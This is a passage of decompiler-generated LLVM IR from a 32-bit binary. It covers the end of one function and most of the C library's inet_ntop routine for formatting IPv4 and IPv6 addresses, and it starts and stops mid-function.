  %v3_8057664 = add i32 %v2_8057664, %v1_8057664
  %v4_8057664 = inttoptr i32 %v3_8057664 to i8*
  store i8 0, i8* %v4_8057664, align 1
  %v0_8057669 = load i32, i32* @esp, align 4
  %v9_8057669 = icmp eq i32 %v0_8057669, 12
  store i1 %v9_8057669, i1* %zf.global-to-local, align 1
  %tmp27 = bitcast i32* %stack_var_-33 to i8*
  store i8* %tmp27, i8** %stack_var_-92, align 4
  %v3_8057671 = call i32 @strlen(i8* %tmp27)
  store i32 %v3_8057671, i32* @eax, align 4
  %v15_8057679 = icmp eq i32 %v3_8057671, %v0_80575b0
  store i1 %v15_8057679, i1* %zf.global-to-local, align 1
  %tmp45 = icmp ugt i32 %v3_8057671, %v0_80575b0
  br i1 %tmp45, label %dec_label_pc_805767f, label %dec_label_pc_805768e

dec_label_pc_805767f:                             ; preds = %dec_label_pc_8057664
  %v0_805767f = load i8*, i8** %stack_var_-92, align 4
  %v1_805767f = ptrtoint i8* %v0_805767f to i32
  %v2_805767f = call i32 @__errno_location(i32 %v1_805767f)
  %v1_8057684 = inttoptr i32 %v2_805767f to i32*
  store i32 28, i32* %v1_8057684, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805769d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805769d

dec_label_pc_805768e:                             ; preds = %dec_label_pc_8057664
  %v2_805766c = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_80576914 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80576914, i32* %tmp29, align 4
  %v0_8057695.cast = inttoptr i32 %v3_80576914 to i8*
  %v4_8057695 = call i32 @strcpy(i8* %v0_8057695.cast, i32 %v2_805766c)
  store i32 %v4_8057695, i32* %eax.global-to-local, align 4
  %v0_805769a = load i32, i32* @esp, align 4
  %v6_805769a = icmp eq i32 %v0_805769a, -16
  store i1 %v6_805769a, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_805769d

dec_label_pc_805769d:                             ; preds = %dec_label_pc_805767f, %dec_label_pc_805768e
  %v0_80576a4 = phi i32 [ 0, %dec_label_pc_805767f ], [ %v4_8057695, %dec_label_pc_805768e ]
  %v0_805769d = phi i32 [ %v0_805769d.pre, %dec_label_pc_805767f ], [ %v15_805759a, %dec_label_pc_805768e ]
  %v9_805769d = icmp eq i32 %v0_805769d, -60
  store i1 %v9_805769d, i1* %zf.global-to-local, align 1
  store i32 %v0_8057596, i32* @esi, align 4
  store i32 %v0_8057595, i32* @edi, align 4
  ret i32 %v0_80576a4

; uselistorder directives
  uselistorder i32 %v0_805765b, { 2, 0, 1 }
  uselistorder i8 %v2_8057635, { 1, 0 }
  uselistorder i32 %v0_805761a, { 1, 0 }
  uselistorder i1 %v11_80575eb, { 1, 0 }
  uselistorder i32 %v1_80575e2, { 1, 0 }
  uselistorder i32 %v5_80575d0, { 1, 0 }
  uselistorder i32 %v0_805765b30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 23, 24, 25, 14, 16, 17, 13, 15, 8, 18, 12, 19, 20, 21, 22, 26, 36, 37, 9, 31, 27, 10, 28, 29, 30, 32, 33, 11, 34, 35, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 5, 38, 39, 0, 1, 40, 41, 42, 47, 2, 3, 30, 4, 52, 53, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 31, 32, 33, 34, 35, 36, 37, 43, 44, 45, 46, 48, 49, 50, 51 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_805769d, { 1, 0 }
  uselistorder label %dec_label_pc_805763b, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80576a6 = load i32, i32* @edi, align 4
  %v0_80576a7 = load i32, i32* @esi, align 4
  %v0_80576a8 = load i32, i32* @ebx, align 4
  %v15_80576a9 = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80576b0 = icmp eq i32 %arg1, 2
  br i1 %v9_80576b0, label %dec_label_pc_80576c0, label %dec_label_pc_80576b5

dec_label_pc_80576b5:                             ; preds = %entry
  %v9_80576b5 = icmp eq i32 %arg1, 10
  %v1_80576b8 = icmp eq i1 %v9_80576b5, false
  br i1 %v1_80576b8, label %dec_label_pc_805785f, label %dec_label_pc_80576d8

dec_label_pc_80576c0:                             ; preds = %entry
  %v4_80576c0 = ptrtoint i8* %arg3 to i32
  store i32 %v4_80576c0, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_80576cc = call i32 @inet_ntop4(i32 %v0_80576a8, i32 %v0_80576a7, i32 %v0_80576a6)
  store i32 %v3_80576cc, i32* %eax.global-to-local, align 4
  store i32 %v3_80576cc, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805786c

dec_label_pc_80576d8:                             ; preds = %dec_label_pc_80576b5
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_80576dd = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_80576dd, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_80576e2 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_80576e2, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8057704 = add i32 %arg2, 1
  br label %dec_label_pc_80576ee

dec_label_pc_80576ee:                             ; preds = %dec_label_pc_80576ee.dec_label_pc_80576ee_crit_edge, %dec_label_pc_80576d8
  %v1_8057711 = phi i32 [ %v15_80576a9, %dec_label_pc_80576d8 ], [ %v1_8057711.pre, %dec_label_pc_80576ee.dec_label_pc_80576ee_crit_edge ]
  %v0_805770970 = phi i32 [ 0, %dec_label_pc_80576d8 ], [ %v0_8057715.pre, %dec_label_pc_80576ee.dec_label_pc_80576ee_crit_edge ]
  %v1_80576f7 = ashr i32 %v0_805770970, 31
  %v2_80576f8 = zext i32 %v0_805770970 to i64
  %v4_80576f8 = zext i32 %v1_80576f7 to i64
  %v5_80576f8 = mul nuw i64 %v4_80576f8, 4294967296
  %v6_80576f8 = or i64 %v5_80576f8, %v2_80576f8
  %v8_80576f8 = sdiv i64 %v6_80576f8, 2
  %v9_80576f8 = trunc i64 %v8_80576f8 to i32
  store i32 %v9_80576f8, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_80576f8, i32* %ebx.global-to-local, align 4
  %v2_8057700 = add i32 %v0_805770970, %arg2
  %v3_8057700 = inttoptr i32 %v2_8057700 to i8*
  %v4_8057700 = load i8, i8* %v3_8057700, align 1
  %v5_8057700 = zext i8 %v4_8057700 to i32
  store i32 %v5_8057700, i32* %eax.global-to-local, align 4
  %v3_8057704 = add i32 %v2_8057704, %v0_805770970
  %v4_8057704 = inttoptr i32 %v3_8057704 to i8*
  %v5_8057704 = load i8, i8* %v4_8057704, align 1
  %v6_8057704 = zext i8 %v5_8057704 to i32
  store i32 %v6_8057704, i32* %edx.global-to-local, align 4
  %v1_8057709 = add i32 %v0_805770970, 2
  store i32 %v1_8057709, i32* %ecx.global-to-local, align 4
  %v2_805770c = mul nuw nsw i32 %v5_8057700, 256
  %v2_805770f = or i32 %v6_8057704, %v2_805770c
  store i32 %v2_805770f, i32* %eax.global-to-local, align 4
  %v3_8057711 = mul i32 %v9_80576f8, 4
  %v4_8057711 = add i32 %v3_8057711, 60
  %v5_8057711 = add i32 %v4_8057711, %v1_8057711
  %v6_8057711 = inttoptr i32 %v5_8057711 to i32*
  store i32 %v2_805770f, i32* %v6_8057711, align 4
  %v0_8057715.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_8057718 = icmp sgt i32 %v0_8057715.pre, 15
  br i1 %v7_8057718, label %dec_label_pc_805771a, label %dec_label_pc_80576ee.dec_label_pc_80576ee_crit_edge

dec_label_pc_80576ee.dec_label_pc_80576ee_crit_edge: ; preds = %dec_label_pc_80576ee
  %v1_8057711.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80576ee

dec_label_pc_805771a:                             ; preds = %dec_label_pc_80576ee
  %v4_80576d8 = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8057724.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8057724

dec_label_pc_8057724:                             ; preds = %dec_label_pc_805771a, %dec_label_pc_8057751
  %v0_805775169 = phi i32 [ 0, %dec_label_pc_805771a ], [ %v1_8057751, %dec_label_pc_8057751 ]
  %v0_805773c68 = phi i32 [ -1, %dec_label_pc_805771a ], [ %v0_805773c8, %dec_label_pc_8057751 ]
  %v0_805775c67 = phi i32 [ -1, %dec_label_pc_805771a ], [ %v0_80577419, %dec_label_pc_8057751 ]
  %v0_805776766 = phi i32 [ -1, %dec_label_pc_805771a ], [ %v0_805774c13, %dec_label_pc_8057751 ]
  %v2_8057724 = mul nuw nsw i32 %v0_805775169, 4
  %v3_8057724 = add nuw nsw i32 %v2_8057724, 60
  %v4_8057724 = add i32 %v3_8057724, %v0_8057724.pre
  %v5_8057724 = inttoptr i32 %v4_8057724 to i32*
  %v6_8057724 = load i32, i32* %v5_8057724, align 4
  %v7_8057724 = icmp eq i32 %v6_8057724, 0
  %v1_8057729 = icmp eq i1 %v7_8057724, false
  %v10_805773c = icmp eq i32 %v0_805773c68, -1
  br i1 %v1_8057729, label %dec_label_pc_805773c, label %dec_label_pc_805772b

dec_label_pc_805772b:                             ; preds = %dec_label_pc_8057724
  %v1_805772e = icmp eq i1 %v10_805773c, false
  br i1 %v1_805772e, label %dec_label_pc_8057739, label %dec_label_pc_8057730

dec_label_pc_8057730:                             ; preds = %dec_label_pc_805772b
  store i32 %v0_805775169, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057751

dec_label_pc_8057739:                             ; preds = %dec_label_pc_805772b
  %v0_8057739 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057739 = add i32 %v0_8057739, 1
  store i32 %v1_8057739, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8057751

dec_label_pc_805773c:                             ; preds = %dec_label_pc_8057724
  br i1 %v10_805773c, label %dec_label_pc_8057751, label %dec_label_pc_8057741

dec_label_pc_8057741:                             ; preds = %dec_label_pc_805773c
  %v10_8057741 = icmp eq i32 %v0_805775c67, -1
  %v0_805774a.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_8057746 = load i32, i32* @ebp, align 4
  %v7_8057748 = icmp sgt i32 %v0_805774a.pre, %v1_8057746
  %or.cond = or i1 %v10_8057741, %v7_8057748
  br i1 %or.cond, label %dec_label_pc_805774a, label %dec_label_pc_805774e

dec_label_pc_805774a:                             ; preds = %dec_label_pc_8057741
  store i32 %v0_805774a.pre, i32* @ebp, align 4
  store i32 %v0_805776766, i32* @edi, align 4
  br label %dec_label_pc_805774e

dec_label_pc_805774e:                             ; preds = %dec_label_pc_8057741, %dec_label_pc_805774a
  %v0_805774111 = phi i32 [ %v0_805776766, %dec_label_pc_805774a ], [ %v0_805775c67, %dec_label_pc_8057741 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057751

dec_label_pc_8057751:                             ; preds = %dec_label_pc_805773c, %dec_label_pc_8057739, %dec_label_pc_8057730, %dec_label_pc_805774e
  %v0_805774c13 = phi i32 [ %v0_805776766, %dec_label_pc_805773c ], [ %v0_805776766, %dec_label_pc_8057739 ], [ %v0_805775169, %dec_label_pc_8057730 ], [ -1, %dec_label_pc_805774e ]
  %v0_805773c8 = phi i32 [ -1, %dec_label_pc_805773c ], [ %v0_805773c68, %dec_label_pc_8057739 ], [ %v0_805775169, %dec_label_pc_8057730 ], [ -1, %dec_label_pc_805774e ]
  %v0_80577419 = phi i32 [ %v0_805775c67, %dec_label_pc_805773c ], [ %v0_805775c67, %dec_label_pc_8057739 ], [ %v0_805775c67, %dec_label_pc_8057730 ], [ %v0_805774111, %dec_label_pc_805774e ]
  %v1_8057751 = add nuw nsw i32 %v0_805775169, 1
  store i32 %v1_8057751, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8057751, 8
  br i1 %exitcond, label %dec_label_pc_8057757, label %dec_label_pc_8057724

dec_label_pc_8057757:                             ; preds = %dec_label_pc_8057751
  %v10_8057757 = icmp eq i32 %v0_805774c13, -1
  br i1 %v10_8057757, label %dec_label_pc_8057769, label %dec_label_pc_805775c

dec_label_pc_805775c:                             ; preds = %dec_label_pc_8057757
  %v10_805775c = icmp eq i32 %v0_80577419, -1
  %v0_8057765.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_805775c, label %dec_label_pc_8057765, label %dec_label_pc_8057761

dec_label_pc_8057761:                             ; preds = %dec_label_pc_805775c
  %v1_8057761 = load i32, i32* @ebp, align 4
  %v7_8057763 = icmp sgt i32 %v0_8057765.pre, %v1_8057761
  br i1 %v7_8057763, label %dec_label_pc_8057765, label %dec_label_pc_8057769

dec_label_pc_8057765:                             ; preds = %dec_label_pc_805775c, %dec_label_pc_8057761
  store i32 %v0_8057765.pre, i32* @ebp, align 4
  store i32 %v0_805774c13, i32* @edi, align 4
  br label %dec_label_pc_8057769

dec_label_pc_8057769:                             ; preds = %dec_label_pc_8057761, %dec_label_pc_8057757, %dec_label_pc_8057765
  %v5_8057776 = phi i32 [ %v0_80577419, %dec_label_pc_8057761 ], [ %v0_80577419, %dec_label_pc_8057757 ], [ %v0_805774c13, %dec_label_pc_8057765 ]
  %v10_8057769 = icmp eq i32 %v5_8057776, -1
  br i1 %v10_8057769, label %dec_label_pc_8057779, label %dec_label_pc_805776e

dec_label_pc_805776e:                             ; preds = %dec_label_pc_8057769
  %v0_805776e = load i32, i32* @ebp, align 4
  %v1_805776e = add i32 %v0_805776e, -1
  %v6_805776e = sub i32 0, %v0_805776e
  %v7_805776e = and i32 %v0_805776e, %v6_805776e
  %v8_805776e = icmp slt i32 %v7_805776e, 0
  %v9_805776e = icmp eq i32 %v1_805776e, 0
  %v10_805776e = icmp slt i32 %v1_805776e, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_8057776 = icmp ne i1 %v10_805776e, %v8_805776e
  %v4_8057776 = or i1 %v9_805776e, %v3_8057776
  %v7_8057776 = select i1 %v4_8057776, i32 -1, i32 %v5_8057776
  store i32 %v7_8057776, i32* @edi, align 4
  br label %dec_label_pc_8057779

dec_label_pc_8057779:                             ; preds = %dec_label_pc_8057769, %dec_label_pc_805776e
  %v0_805781918 = phi i32 [ %v5_8057776, %dec_label_pc_8057769 ], [ %v7_8057776, %dec_label_pc_805776e ]
  %v2_8057779 = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_8057779, i32* @ebx, align 4
  %v3_80577fb = add i32 %v4_80576d8, 64
  %v12_80577b9 = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805781958 = icmp eq i32 %v0_805781918, -1
  %v1_80577c1 = icmp eq i1 %v12_80577b9, false
  br label %dec_label_pc_8057784

dec_label_pc_8057784:                             ; preds = %dec_label_pc_8057779, %dec_label_pc_805780f
  %v10_805781965 = phi i1 [ %v10_805781958, %dec_label_pc_8057779 ], [ %v10_8057819, %dec_label_pc_805780f ]
  %v0_805779e64 = phi i32 [ 0, %dec_label_pc_8057779 ], [ %v1_805780f, %dec_label_pc_805780f ]
  %v1_805779463 = phi i32 [ %v0_805781918, %dec_label_pc_8057779 ], [ %v0_8057819.pre, %dec_label_pc_805780f ]
  %v0_80577a262 = phi i32 [ %v2_8057779, %dec_label_pc_8057779 ], [ %v0_805779819, %dec_label_pc_805780f ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_8057779 ], [ %stack_var_-120.0, %dec_label_pc_805780f ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_8057779 ], [ %stack_var_-116.0, %dec_label_pc_805780f ]
  br i1 %v10_805781965, label %dec_label_pc_805779e, label %dec_label_pc_8057789

dec_label_pc_8057789:                             ; preds = %dec_label_pc_8057784
  %v2_8057789 = sub i32 %v0_805779e64, %v1_805779463
  %v8_8057789 = xor i32 %v0_805779e64, %v1_805779463
  %v9_8057789 = xor i32 %v2_8057789, %v0_805779e64
  %v10_8057789 = and i32 %v9_8057789, %v8_8057789
  %v11_8057789 = icmp slt i32 %v10_8057789, 0
  %v12_8057789 = icmp eq i32 %v2_8057789, 0
  %v13_8057789 = icmp slt i32 %v2_8057789, 0
  %v2_805778b = icmp eq i1 %v13_8057789, %v11_8057789
  br i1 %v2_805778b, label %dec_label_pc_805778d, label %dec_label_pc_805779e

dec_label_pc_805778d:                             ; preds = %dec_label_pc_8057789
  %v1_805778d = load i32, i32* @ebp, align 4
  %v2_805778d = add i32 %v1_805778d, %v1_805779463
  store i32 %v2_805778d, i32* %eax.global-to-local, align 4
  %v2_8057790 = sub i32 %v0_805779e64, %v2_805778d
  %v8_8057790 = xor i32 %v2_805778d, %v0_805779e64
  %v9_8057790 = xor i32 %v2_8057790, %v0_805779e64
  %v10_8057790 = and i32 %v9_8057790, %v8_8057790
  %v11_8057790 = icmp slt i32 %v10_8057790, 0
  %v13_8057790 = icmp slt i32 %v2_8057790, 0
  %v2_8057792 = icmp eq i1 %v13_8057790, %v11_8057790
  br i1 %v2_8057792, label %dec_label_pc_805779e, label %dec_label_pc_8057794

dec_label_pc_8057794:                             ; preds = %dec_label_pc_805778d
  %v1_8057796 = icmp eq i1 %v12_8057789, false
  br i1 %v1_8057796, label %dec_label_pc_805780f, label %dec_label_pc_8057798

dec_label_pc_8057798:                             ; preds = %dec_label_pc_8057794
  %v1_8057798 = inttoptr i32 %v0_80577a262 to i8*
  store i8 58, i8* %v1_8057798, align 1
  %v0_805779b = load i32, i32* @ebx, align 4
  %v1_805779b = add i32 %v0_805779b, 1
  store i32 %v1_805779b, i32* @ebx, align 4
  br label %dec_label_pc_805780f

dec_label_pc_805779e:                             ; preds = %dec_label_pc_8057789, %dec_label_pc_805778d, %dec_label_pc_8057784
  %v1_805779e = icmp eq i32 %v0_805779e64, 0
  br i1 %v1_805779e, label %dec_label_pc_80577a6, label %dec_label_pc_80577a2

dec_label_pc_80577a2:                             ; preds = %dec_label_pc_805779e
  %v1_80577a2 = inttoptr i32 %v0_80577a262 to i8*
  store i8 58, i8* %v1_80577a2, align 1
  %v0_80577a5 = load i32, i32* @ebx, align 4
  %v1_80577a5 = add i32 %v0_80577a5, 1
  store i32 %v1_80577a5, i32* @ebx, align 4
  %v0_80577a6.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80577a6

dec_label_pc_80577a6:                             ; preds = %dec_label_pc_805779e, %dec_label_pc_80577a2
  %v0_8057804 = phi i32 [ %v0_80577a262, %dec_label_pc_805779e ], [ %v1_80577a5, %dec_label_pc_80577a2 ]
  %v1_80577fb = phi i32 [ 0, %dec_label_pc_805779e ], [ %v0_80577a6.pre, %dec_label_pc_80577a2 ]
  %v9_80577a6 = icmp eq i32 %v1_80577fb, 6
  %v1_80577a9 = icmp eq i1 %v9_80577a6, false
  br i1 %v1_80577a9, label %dec_label_pc_80577fa, label %dec_label_pc_80577ab

dec_label_pc_80577ab:                             ; preds = %dec_label_pc_80577a6
  %v0_80577ab = load i32, i32* @edi, align 4
  %v1_80577ab = icmp eq i32 %v0_80577ab, 0
  %v1_80577ad = icmp eq i1 %v1_80577ab, false
  br i1 %v1_80577ad, label %dec_label_pc_80577fa, label %dec_label_pc_80577af

dec_label_pc_80577af:                             ; preds = %dec_label_pc_80577ab
  %v0_80577af = load i32, i32* @ebp, align 4
  %v9_80577af = icmp eq i32 %v0_80577af, 6
  br i1 %v9_80577af, label %dec_label_pc_80577c3, label %dec_label_pc_80577b4

dec_label_pc_80577b4:                             ; preds = %dec_label_pc_80577af
  %v9_80577b4 = icmp eq i32 %v0_80577af, 5
  %v1_80577b7 = icmp eq i1 %v9_80577b4, false
  br i1 %v1_80577b7, label %dec_label_pc_80577fa, label %dec_label_pc_80577b9

dec_label_pc_80577b9:                             ; preds = %dec_label_pc_80577b4
  br i1 %v1_80577c1, label %dec_label_pc_80577fa, label %dec_label_pc_80577c3

dec_label_pc_80577c3:                             ; preds = %dec_label_pc_80577b9, %dec_label_pc_80577af
  %v2_80577c9 = sub i32 %v0_8057804, %v2_8057779
  store i32 %v2_80577c9, i32* @esi, align 4
  %v2_80577d4 = sub i32 46, %v2_80577c9
  store i32 %v2_80577d4, i32* @ecx, align 4
  store i32 %v0_8057804, i32* @edx, align 4
  %v1_80577d8 = add i32 %arg2, 12
  store i32 %v1_80577d8, i32* @eax, align 4
  %v0_80577db = load i8*, i8** %stack_var_-124, align 4
  %v1_80577db = ptrtoint i8* %v0_80577db to i32
  %v3_80577db = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_80577db = call i32 @inet_ntop4(i32 %v1_80577db, i32 %v3_80577db, i32 %stack_var_-116.160)
  store i32 %v5_80577db, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_80577e2 = icmp eq i32 %v5_80577db, 0
  br i1 %v1_80577e2, label %dec_label_pc_805786c, label %dec_label_pc_80577ea

dec_label_pc_80577ea:                             ; preds = %dec_label_pc_80577c3
  %v0_80577ed = load i32, i32* @ebx, align 4
  %v5_80577ed = inttoptr i32 %v0_80577ed to i8*
  store i8* %v5_80577ed, i8** %stack_var_-124, align 4
  %v3_80577ee = call i32 @strlen(i8* %v5_80577ed)
  store i32 %v3_80577ee, i32* %eax.global-to-local, align 4
  %v0_80577f6 = load i32, i32* @ebx, align 4
  %v3_80577f6 = add i32 %v0_80577f6, %v3_80577ee
  store i32 %v3_80577f6, i32* @ebx, align 4
  %v0_805781e.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805781e

dec_label_pc_80577fa:                             ; preds = %dec_label_pc_80577b9, %dec_label_pc_80577b4, %dec_label_pc_80577ab, %dec_label_pc_80577a6
  %v0_80577fa = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_80577fa, i32* %stack_var_-112, align 4
  %v2_80577fb = mul i32 %v1_80577fb, 4
  %v4_80577fb = add i32 %v3_80577fb, %v2_80577fb
  %v5_80577fb = inttoptr i32 %v4_80577fb to i32*
  %v6_80577fb = load i32, i32* %v5_80577fb, align 4
  %v5_8057804 = inttoptr i32 %v0_8057804 to i8*
  store i8* %v5_8057804, i8** %stack_var_-124, align 4
  %v6_8057805 = call i32 @sprintf(i32 %v0_8057804, i32 ptrtoint ([3 x i8]* @global_var_805b531.574 to i32), i32 %v6_80577fb, i32 %v0_80577fa)
  store i32 %v6_8057805, i32* %eax.global-to-local, align 4
  %v0_805780d = load i32, i32* @ebx, align 4
  %v2_805780d = add i32 %v0_805780d, %v6_8057805
  store i32 %v2_805780d, i32* @ebx, align 4
  br label %dec_label_pc_805780f

dec_label_pc_805780f:                             ; preds = %dec_label_pc_8057794, %dec_label_pc_8057798, %dec_label_pc_80577fa
  %stack_var_-116.0 = phi i32 [ %v6_80577fb, %dec_label_pc_80577fa ], [ %stack_var_-116.160, %dec_label_pc_8057794 ], [ %stack_var_-116.160, %dec_label_pc_8057798 ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805b531.574, i32 0, i32 0), %dec_label_pc_80577fa ], [ %stack_var_-120.161, %dec_label_pc_8057794 ], [ %stack_var_-120.161, %dec_label_pc_8057798 ]
  %v0_805779819 = phi i32 [ %v2_805780d, %dec_label_pc_80577fa ], [ %v0_80577a262, %dec_label_pc_8057794 ], [ %v1_805779b, %dec_label_pc_8057798 ]
  %v0_805780f = load i32, i32* @esi, align 4
  %v1_805780f = add i32 %v0_805780f, 1
  %v0_8057819.pre = load i32, i32* @edi, align 4
  store i32 %v1_805780f, i32* @esi, align 4
  %v7_8057813 = icmp sgt i32 %v1_805780f, 7
  %v10_8057819 = icmp eq i32 %v0_8057819.pre, -1
  br i1 %v7_8057813, label %dec_label_pc_8057819, label %dec_label_pc_8057784

dec_label_pc_8057819:                             ; preds = %dec_label_pc_805780f
  br i1 %v10_8057819, label %dec_label_pc_805782a, label %dec_label_pc_805781e

dec_label_pc_805781e:                             ; preds = %dec_label_pc_8057819, %dec_label_pc_80577ea
  %v0_8057826 = phi i32 [ %v0_805779819, %dec_label_pc_8057819 ], [ %v3_80577f6, %dec_label_pc_80577ea ]
  %v0_805781e = phi i32 [ %v0_8057819.pre, %dec_label_pc_8057819 ], [ %v0_805781e.pre, %dec_label_pc_80577ea ]
  %v1_805781e = load i32, i32* @ebp, align 4
  %v2_805781e = add i32 %v1_805781e, %v0_805781e
  store i32 %v2_805781e, i32* %eax.global-to-local, align 4
  %v9_8057821 = icmp eq i32 %v2_805781e, 8
  %v1_8057824 = icmp eq i1 %v9_8057821, false
  br i1 %v1_8057824, label %dec_label_pc_805782a, label %dec_label_pc_8057826

dec_label_pc_8057826:                             ; preds = %dec_label_pc_805781e
  %v1_8057826 = inttoptr i32 %v0_8057826 to i8*
  store i8 58, i8* %v1_8057826, align 1
  %v0_8057829 = load i32, i32* @ebx, align 4
  %v1_8057829 = add i32 %v0_8057829, 1
  store i32 %v1_8057829, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805782a

dec_label_pc_805782a:                             ; preds = %dec_label_pc_805781e, %dec_label_pc_8057819, %dec_label_pc_8057826
  %v0_805782e = phi i32 [ %v0_8057826, %dec_label_pc_805781e ], [ %v0_805779819, %dec_label_pc_8057819 ], [ %v1_8057829, %dec_label_pc_8057826 ]
  store i32 %v2_8057779, i32* %edx.global-to-local, align 4
  %v1_805782e = add i32 %v0_805782e, 1
  store i32 %v1_805782e, i32* %eax.global-to-local, align 4
  %v1_8057831 = inttoptr i32 %v0_805782e to i8*
  store i8 0, i8* %v1_8057831, align 1
  %v0_8057834 = load i32, i32* %eax.global-to-local, align 4
  %v1_8057834 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057834 = sub i32 %v0_8057834, %v1_8057834
  store i32 %v2_8057834, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_8057834, %arg4
  br i1 %tmp75, label %dec_label_pc_805783c, label %dec_label_pc_8057849

dec_label_pc_805783c:                             ; preds = %dec_label_pc_805782a
  %v0_805783c = load i8*, i8** %stack_var_-124, align 4
  %v1_805783c = ptrtoint i8* %v0_805783c to i32
  %v2_805783c = call i32 @__errno_location(i32 %v1_805783c)
  store i32 %v2_805783c, i32* %eax.global-to-local, align 4
  %v1_8057841 = inttoptr i32 %v2_805783c to i32*
  store i32 28, i32* %v1_8057841, align 4
  br label %dec_label_pc_805786a

dec_label_pc_8057849:                             ; preds = %dec_label_pc_805782a
  %v0_8057849 = load i32, i32* @edi, align 4
  store i32 %v0_8057849, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_805784c2 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_805784c2, i32* %tmp46, align 4
  %v0_8057853.cast = inttoptr i32 %v3_805784c2 to i8*
  %v5_8057853 = call i32 @strcpy(i8* %v0_8057853.cast, i32 %v2_8057779)
  store i32 %v5_8057853, i32* %eax.global-to-local, align 4
  store i32 %v5_8057853, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805786c

dec_label_pc_805785f:                             ; preds = %dec_label_pc_80576b5
  %v1_805785f = call i32 @__errno_location(i32 %v0_80576a8)
  store i32 %v1_805785f, i32* %eax.global-to-local, align 4
  %v1_8057864 = inttoptr i32 %v1_805785f to i32*
  store i32 97, i32* %v1_8057864, align 4
  br label %dec_label_pc_805786a

dec_label_pc_805786a:                             ; preds = %dec_label_pc_805783c, %dec_label_pc_805785f
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805786c

dec_label_pc_805786c:                             ; preds = %dec_label_pc_80577c3, %dec_label_pc_8057849, %dec_label_pc_80576c0, %dec_label_pc_805786a
